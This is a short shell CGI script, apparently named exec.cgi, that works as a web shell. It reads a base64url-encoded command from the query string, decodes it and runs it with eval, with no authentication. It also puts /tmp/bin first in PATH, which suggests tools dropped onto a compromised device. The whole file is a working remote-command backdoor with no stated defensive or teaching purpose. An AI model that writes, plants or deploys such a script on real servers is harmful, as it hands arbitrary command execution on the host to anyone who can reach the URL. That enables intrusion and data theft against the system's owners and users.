#!/bin/sh
echo "Content-type: text/plain"; echo
PATH=/tmp/bin:$PATH; export PATH
# command arrives base64url-encoded in ?c=  (avoids URL-decoding in shell)
c=$(echo "$QUERY_STRING" | sed -n 's/^.*c=\([^&]*\).*$/\1/p')
[ -z "$c" ] && { echo "usage: exec.cgi?c=<base64url(command)>"; exit 0; }
c=$(echo "$c" | tr '_-' '/+')            # base64url -> std base64 (needs modern tr)
m=$(( ${#c} % 4 ))
[ "$m" = 2 ] && c="${c}=="
[ "$m" = 3 ] && c="${c}="
cmd=$(echo "$c" | base64 -d 2>/dev/null)  # modern busybox base64
[ -z "$cmd" ] && { echo "(could not decode command)"; exit 0; }
echo "\$ $cmd"
echo "----------------------------------------"
eval "$cmd" 2>&1
